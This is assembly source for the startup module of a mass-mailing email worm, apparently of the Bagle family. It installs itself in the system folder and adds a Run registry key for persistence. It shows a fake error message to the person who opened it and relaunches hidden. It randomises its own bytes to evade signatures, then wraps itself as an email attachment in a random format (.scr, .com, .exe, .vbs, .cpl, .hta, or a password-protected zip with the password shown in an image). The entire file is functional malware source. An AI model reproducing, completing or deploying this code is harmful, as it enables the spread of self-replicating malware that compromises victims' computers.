; StartUp Stuff, Loading settings, etc...
; #########################################################################

.data
        szShowMessage           db      "Can't find a viewer associated with the file",0
        szShowCaption           db      "Error!",0        


        szRegAutoPath           db      "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
        szTextOpen              db      "open",0
        szExeExe                db      ".exe",0
        szExeScr                db      ".scr",0
        szExeCom                db      ".com",0
        szExeZip                db      ".zip",0
        szExeVbs                db      ".vbs",0
        szExeHta                db      ".hta",0
        szExeCpl                db      ".cpl",0

        b64Attach               dd      0
        b64AttachLen            dd      0

        b64SrcAttach            dd      0
        b64SrcAttachLen         dd      0


        b64Password             dd      0
        b64PasswordLen          dd      0
        b64PasswordMime         dd      0

        ; Admin thread mutex
        mootex                  dd      0               ; Mooo-moooo :)
        szAttachExt             dd      offset szExeScr

        bPassImgOnly            dd      0

.data?
        ; Zip password
        szZipPassBuff           db      101 dup(?)
        ; Real worm name
        szSysDirFileName        db      MAX_PATH+1 dup(?)
        ; Current worm name (being executed)
        szRunFileName           db      MAX_PATH+1 dup(?)

.code

EmailRandInit proto
EmailRandomExt proto

; Write autorun
WriteAutoStart proc
        LOCAL   hkHandle: DWORD

        ; Write autorun
        invoke  RegCreateKey, HKEY_CURRENT_USER, offset szRegAutoPath, addr hkHandle
        invoke  lstrlen, offset szSysDirFileName
        invoke  RegSetValueEx, hkHandle, offset szBglAutoKey, 0, REG_SZ, offset szSysDirFileName, eax
        invoke  RegCloseKey, hkHandle
        ret
WriteAutoStart endp

; Remove registry entries (uninistall)
; Suicide disabled
DoSelfDelete proc
        LOCAL   hkHandle: DWORD

        invoke  RegDeleteKey, HKEY_CURRENT_USER, offset szRegBasePath
        invoke  RegCreateKey, HKEY_CURRENT_USER, offset szRegAutoPath, addr hkHandle
        invoke  RegDeleteValue, hkHandle, offset szBglAutoKey
        invoke  RegCloseKey, hkHandle

        invoke  ExitProcess, 0
        ret
DoSelfDelete endp

; Get ptr to last section in .exe file (IN: ebx - ptr to file)
LastSectionHeadPtr proc
        PEPtrB  eax, ebx
        movzx   ecx, word ptr[eax+06h]
        dec     ecx

        ; Num * 28h
        xor     edx, edx
        mov     eax, 28h ; obj table size
        mul     ecx

        ; ...+ PE + 0f8h
        PEPtrB  edx, ebx
        add     eax, edx
        add     eax, 0f8h ; size of PE header
        ret   
LastSectionHeadPtr endp

; Get file length and truncate it to it's real length
; then append 5-1505 bytes of junk
TruncSrcFile proc uses ebx edi lpIn: DWORD
        LOCAL   hFileOut, bWritten: DWORD
        LOCAL   JUNK_BYTE: BYTE

        IFNDEF  TESTVERSION
                invoke  Sleep, 3000
        ENDIF

        invoke  CreateFile, lpIn, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL
        mov     hFileOut, eax
        inc     eax
        jz      @tsf_ret

        xor     edi, edi

        invoke  CreateFileMapping, hFileOut, NULL, PAGE_READWRITE, 0, 0, NULL
        .IF     eax
                push    eax
                invoke  MapViewOfFile, eax, FILE_MAP_ALL_ACCESS, 0, 0, 0
                .IF     eax
                        mov     ebx, eax

                        invoke  LastSectionHeadPtr
                        mov     edi, [eax][SectionHead.PhysOffs]
                        add     edi, [eax][SectionHead.PhysSize]

                        invoke  UnmapViewOfFile, ebx
                .ENDIF
                call    CloseHandle
        .ENDIF
        invoke  SetFilePointer, hFileOut, edi, 0, 0
        invoke  SetEndOfFile, hFileOut
        invoke  SetFilePointer, hFileOut, 0, 0, FILE_END

        ; Write junk data        
        invoke  Rand, 1500
        add     eax, 5
        mov     edi, eax
@l:
        invoke  Rand, 200
        mov     JUNK_BYTE, al
        invoke  WriteFile, hFileOut, addr JUNK_BYTE, 1, addr bWritten, NULL
        dec     edi
        jnz     @l

        invoke  CloseHandle, hFileOut

@tsf_ret:
        ret
TruncSrcFile endp

; Convert Sources attach to Base64 format
SrcFileToBase64 proc
	invoke  GlobalAlloc, GPTR, SrcFileLen shl 1
	mov	b64SrcAttach, eax
	invoke  Base64Encode, offset SrcFile, eax, SrcFileLen
	invoke	lstrlen, b64SrcAttach
	mov	b64SrcAttachLen, eax
	ret
SrcFileToBase64 endp

; Convert file to Base64 format
FileToBase64 proc uses ebx edi lpDestFileName, outMem, outLen: DWORD
        LOCAL   hFile, dwFileSize: DWORD

        xor     edi, edi

        invoke  CreateFile, lpDestFileName, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @file_open_error
        
        invoke  GetFileSize, hFile, 0
        mov     dwFileSize, eax
        inc     eax
        jz      @file_open_close

        invoke  CreateFileMapping, hFile, NULL, PAGE_READONLY, 0, 0, NULL
        .IF     eax
                mov     ebx, eax
                invoke  MapViewOfFile, eax, FILE_MAP_READ, 0, 0, 0
                .IF     eax
                        push    eax

                        mov     eax, dwFileSize

                        shl     eax, 1
                        invoke  GlobalAlloc, GPTR, eax
                        mov     edx, outMem
                        mov     [edx], eax
                        mov     edx, [esp]

                        invoke  Base64Encode, edx, eax, dwFileSize
                        mov     edx, outMem
                        invoke  lstrlen, [edx]


                        mov     edx, outLen
                        mov     [edx], eax

                        call    UnmapViewOfFile

                        inc     edi
                .ENDIF
                invoke  CloseHandle, ebx
        .ENDIF

@file_open_close:
        invoke  CloseHandle, hFile

@file_open_error:
        mov     eax, edi
        ret
FileToBase64 endp

EmailRandomPassOnlyFmt proto

EncodePass proc uses ebx szPass: DWORD
        LOCAL   lpwData[50]: BYTE
        LOCAL   lpDestFileName: DWORD

        invoke  Rand, 100
        .IF     eax > 70
                ; 30% image password only
                mov     bPassImgOnly, 1
                invoke  EmailRandomPassOnlyFmt
                invoke  wsprintf, addr lpwData, eax, szPass
        .ELSE
                ; 70% normal message
                invoke  lstrcpy, addr lpwData, szPass
        .ENDIF

        invoke  GlobalAlloc, GPTR, 8192
        mov     lpDestFileName, eax
        invoke  lstrcpy, eax, offset szSysDirFileName
        invoke  lstrcat, lpDestFileName, offset szTextOpen
        invoke  lstrcat, lpDestFileName, offset szTextOpen
        invoke  lstrcat, lpDestFileName, offset szTextOpen

        invoke  GenTextPassImage, addr lpwData, lpDestFileName
        test    eax, eax
        jz      @file_open_error
        mov     b64PasswordMime, eax

        invoke  FileToBase64, lpDestFileName, offset b64Password, offset b64PasswordLen

@file_open_error:
        invoke  GlobalFree, lpDestFileName
        ret
EncodePass endp

IFNDEF  DisableInfect
        LoadWorkFile proto :DWORD
ENDIF

EncodeSelf proc uses ebx
        LOCAL   hFile, hFile2, dwFileSize, dwWritten: DWORD
        LOCAL   lpDestFileName, lpSrcFileName, lpOrigFileName, lpTextFileName, lpTextFileName2: DWORD
        LOCAL   buf2[30]: BYTE
        LOCAL   buf[30]: BYTE

        invoke  GlobalAlloc, GPTR, 8192
        mov     lpTextFileName, eax

        invoke  GlobalAlloc, GPTR, 8192
        mov     lpTextFileName2, eax
        invoke  GetRandomID, eax, 6

        invoke  GlobalAlloc, GPTR, 8192
        mov     lpDestFileName, eax
        invoke  lstrcpy, lpDestFileName, offset szSysDirFileName

        invoke  StrDup, lpDestFileName
        mov     lpOrigFileName, eax

        invoke  lstrcat, lpDestFileName, offset szTextOpen
        invoke  StrDup, lpDestFileName
        mov     lpSrcFileName, eax

        invoke  lstrcat, lpDestFileName, offset szTextOpen
        invoke  lstrcpy, lpTextFileName, lpDestFileName

        invoke  lstrcat, lpTextFileName, offset szTextOpen
        invoke  lstrcat, lpTextFileName, offset szTextOpen

        invoke  SetFileAttributes, lpSrcFileName, FILE_ATTRIBUTE_NORMAL
        invoke  SetFileAttributes, lpTextFileName, FILE_ATTRIBUTE_NORMAL
        invoke  SetFileAttributes, lpDestFileName, FILE_ATTRIBUTE_NORMAL
        invoke  CopyFile, lpOrigFileName, lpSrcFileName, FALSE

        ; Zero set password
        invoke  ZeroMemory, offset szZipPassBuff, 100

        ; Remove junk bytes
        invoke  TruncSrcFile, lpSrcFileName

        ; Random bytes in .xxx file
        invoke  ZeroMemory, addr buf2, 30
        invoke  Rand, 5
        add     eax, 5
        invoke  GetRandomID, addr buf2, eax
        invoke  EmailRandomExt
        invoke  lstrcat, addr buf2, eax

        ; Choose random .exe name for zip attach
        invoke  ZeroMemory, addr buf, 30
        invoke  Rand, 5
        add     eax, 5
        invoke  GetRandomID, addr buf, eax
        invoke  lstrcat, addr buf, offset szExeExe

        invoke  Rand, 100
        .IF     eax >= 50
                ; 50% zip, vbs, cpl, hta

                invoke  Rand, 100
                .IF     eax >= 80
                        ; 20% zip

                        ; Create junk file
                        invoke  CreateFile, lpTextFileName, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL
                        mov     hFile2, eax
                        invoke  lstrlen, lpTextFileName2
                        xchg    eax, edx
                        invoke  WriteFile, hFile2, lpTextFileName2, edx, addr dwWritten, NULL
                        invoke  CloseHandle, hFile2

                	; Gen password
                        invoke  GetRandomNumID, offset szZipPassBuff, 5
                        invoke  EncodePass, offset szZipPassBuff

                        mov     szAttachExt, offset szExeZip
                        invoke  CreateZipFile, lpSrcFileName, lpTextFileName, lpDestFileName, addr buf, addr buf2, offset szZipPassBuff
                .ELSEIF eax >= 50
                        ; 30% vbs
                        mov     szAttachExt, offset szExeVbs
                        invoke  CreateVBSFile, lpSrcFileName, lpDestFileName
                .ELSEIF eax >= 20
                        ; 30% cpl
                        mov     szAttachExt, offset szExeCpl
                        invoke  CreateCPLFile, lpSrcFileName, lpDestFileName
                .ELSE
                        ; 20% hta
                        mov     szAttachExt, offset szExeHta
                        invoke  CreateHTAFile, lpSrcFileName, lpDestFileName
                .ENDIF
        .ELSE
                ; 50% plain
                invoke  Rand, 100
                .IF     eax >= 80
                        ; 20% exe
                        mov     szAttachExt, offset szExeExe
                .ELSEIF eax >= 40
                        ; 40% com
                        mov     szAttachExt, offset szExeCom
                .ELSE
                        ; 40% scr
                        mov     szAttachExt, offset szExeScr
                .ENDIF
                invoke  SetFileAttributes, lpDestFileName, FILE_ATTRIBUTE_NORMAL
                invoke  CopyFile, lpSrcFileName, lpDestFileName, FALSE
        .ENDIF
        test    eax, eax
        jz      @file_open_error

        invoke  FileToBase64, lpDestFileName, offset b64Attach, offset b64AttachLen

@file_open_error:
        invoke  GlobalFree, lpDestFileName
        invoke  LocalFree, lpSrcFileName
        invoke  LocalFree, lpOrigFileName
        invoke  GlobalFree, lpTextFileName
        invoke  GlobalFree, lpTextFileName2

        IFNDEF  DisableInfect
                invoke  LoadWorkFile, offset szSysDirFileName
        ENDIF
        ret
EncodeSelf endp

IsShouldRun proc
        LOCAL   SysTime: SYSTEMTIME
        LOCAL   UntilTime: SYSTEMTIME
        LOCAL   FilTime: FILETIME
        LOCAL   UntilFil: FILETIME

        invoke  GetLocalTime, addr SysTime
        invoke  ZeroMemory, addr UntilTime, sizeof SYSTEMTIME
        mov     UntilTime.wYear, WorkUntilYear
        mov     UntilTime.wMonth, WorkUntilMonth
        mov     UntilTime.wDay, WorkUntilDay

        invoke  SystemTimeToFileTime, addr SysTime, addr FilTime
        invoke  SystemTimeToFileTime, addr UntilTime, addr UntilFil

        invoke  CompareFileTime, addr FilTime, addr UntilFil
        .IF     eax == 1
                xor     eax, eax
        .ELSE
                xor     eax, eax
                inc     eax
        .ENDIF
        ret
IsShouldRun endp

; Delete previous instance if running
KillPrevInst proc uses esi ebx
        LOCAL   Process: PROCESSENTRY32
        LOCAL   hSnapshot: DWORD

        invoke  GetCurrentProcessId
        mov     esi, eax

        mov     ebx, offset szBglRealName
        inc     ebx

        mov     Process.dwSize, sizeof PROCESSENTRY32
        invoke  CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
        mov     hSnapshot, eax

        invoke  Process32First, hSnapshot, addr Process
@l:
        .IF     eax
                invoke  StrStrI, addr Process.szExeFile, ebx
                .IF     (eax) && (Process.th32ProcessID != esi)
                        invoke  KillProcess, Process.th32ProcessID
                .ENDIF
                invoke  Process32Next, hSnapshot, addr Process
                jmp     @l
        .ENDIF

        invoke  CloseHandle, hSnapshot

        IFNDEF  TESTVERSION
                invoke  Sleep, 3500
        ENDIF

        xor     eax, eax
        ret
KillPrevInst endp

StartUp proc
        LOCAL   upd: DWORD

        mov     upd, FALSE

        invoke  CRC32BuildTable
        invoke  Randomize
        invoke  EmailRandInit

        ; Get loader filename & add it to autorun
        invoke  GetSystemDirectory, offset szSysDirFileName, MAX_PATH
        invoke  lstrcat, offset szSysDirFileName, offset szBglRealName
        invoke  GetModuleFileName, NULL, offset szRunFileName, MAX_PATH
        invoke  WriteAutoStart

        invoke  SetFileAttributes, offset szSysDirFileName, FILE_ATTRIBUTE_NORMAL

        invoke  GetCommandLine
@check_upd_loop:
        cmp     dword ptr[eax+1], 'dpu-'
        jz      @do_update
        IFDEF   TESTVERSION
        cmp     dword ptr[eax+1], 'led-'
        jz      @do_del
        ENDIF
        inc     eax
        cmp     byte ptr[eax+4], 0
        jnz     @check_upd_loop
        jmp     @do_not_update

        IFDEF   TESTVERSION
@do_del:
        invoke  KillPrevInst
        invoke  DoSelfDelete
        ENDIF

@do_update:
        mov     upd, TRUE
        invoke  KillPrevInst

@do_not_update:
        ; Check if running from system folder
        invoke  lstrcmpi, offset szRunFileName, offset szSysDirFileName
        .IF     eax
                ; Running from unknown folder

                ; Show error message
                .IF     !upd
                        invoke  GetDesktopWindow
                        invoke  MessageBox, eax, offset szShowMessage, offset szShowCaption, MB_ICONERROR
                .ENDIF

                ; Copy file to %system% folder and run
                invoke  SetFileAttributes, offset szSysDirFileName, FILE_ATTRIBUTE_NORMAL
                invoke  CopyFile, offset szRunFileName, offset szSysDirFileName, FALSE
                .IF     eax
                        invoke  SetFileAttributes, offset szSysDirFileName, FILE_ATTRIBUTE_NORMAL
                        invoke  ShellExecute, 0, offset szTextOpen, offset szSysDirFileName, NULL, NULL, SW_HIDE
                .ENDIF
                invoke  ExitProcess, 0
	.ELSE
		; Running from system folder, start replacation code
        .ENDIF
        ret
StartUp endp
